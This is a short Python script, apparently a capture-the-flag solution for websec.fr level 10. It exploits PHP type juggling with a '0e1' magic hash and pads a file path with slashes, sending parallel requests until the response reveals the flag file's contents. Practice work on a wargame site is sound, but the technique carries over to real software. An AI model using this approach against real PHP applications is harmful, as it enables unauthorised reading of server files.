import requests
import re
from concurrent.futures import ThreadPoolExecutor, as_completed

URL = 'http://websec.fr/level10/index.php'
MAX_WORKERS = 10

# Function to check for flag in the response
def check_flag(counter):
    f = '.' + '/' * counter + 'flag.php'
    hash_val = '0e1'  # Type-juggling hash
    print(f"Trying with {counter} slashes")
    try:
        resp = requests.get(URL, params={'f': f, 'hash': hash_val}, timeout=3)
        if 'WEBSEC{' in resp.text:
            match = re.search(r'WEBSEC{.*?}', resp.text)
            if match:
                print(f"\n✅ Found flag in {f}: {match.group(0)}")
                return True
    except Exception as e:
        pass
    return False

# Main part for parallelizing requests
def main():
    counter = 1
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        while True:
            # Submit multiple tasks to check different counters in parallel
            futures = [executor.submit(check_flag, counter + i) for i in range(MAX_WORKERS)]
            results = [future.result() for future in futures]
            
            # Check if any task found the flag
            if any(results):
                break
            
            counter += MAX_WORKERS  # Increase the counter by 10 to speed up the process

if __name__ == "__main__":
    main()